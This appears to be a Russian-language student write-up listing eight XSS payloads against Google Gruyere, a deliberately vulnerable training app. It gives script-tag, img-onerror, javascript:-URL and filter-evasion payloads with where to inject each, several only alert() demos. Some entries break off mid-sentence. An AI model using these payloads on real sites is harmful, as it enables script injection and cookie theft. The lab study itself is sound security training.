# Payloads для gruyere

_Пример оформления работы_

## Payload 1

При переходе по ссылке https://example.com/example. Параметр example можно заменить на пейлоад <script>alert(document.cookies)</script> для выполнения Reflected XSS инъекции в элементе <div id="search-query-param">...</div>, который покажет куки файлы пользователя

## Payload 2

При изменении цвета на скрипт <STYLE type="text/css">BODY{background:url("javascript:javascript:alert(8)")}</STYLE> и вход на аккаунт

## Payload 3

При загрузке скрипта вводим <img src/onerror=alert(3)> на страницу editprofile.gtl в форму редактирования 'Homepage'

## Payload 4

В 'new snippets' в конце адресной строки добавляем <a%20href="javas/x00cript:javascript:alert(1)"%20id="fuzzelement1"><script>alert("213")</script></a>

## Payload 5

На главной странице вводим в поисковую строку <img src/onerror=alert(2)> 

## Payload 6

Если в профиле вставить в качестве домашней страницы javascript:alert(1), то при переходе по этой ссылке 

## Payload 7

При загрузке скрипта <img src/onerror=alert(21)> в html файле а после перехода на главную страницу

## Payload 8

При добавлении в конец адресной строки на sign in <img src="/" =_=" title="onerror='alert(6666666666666666)'">
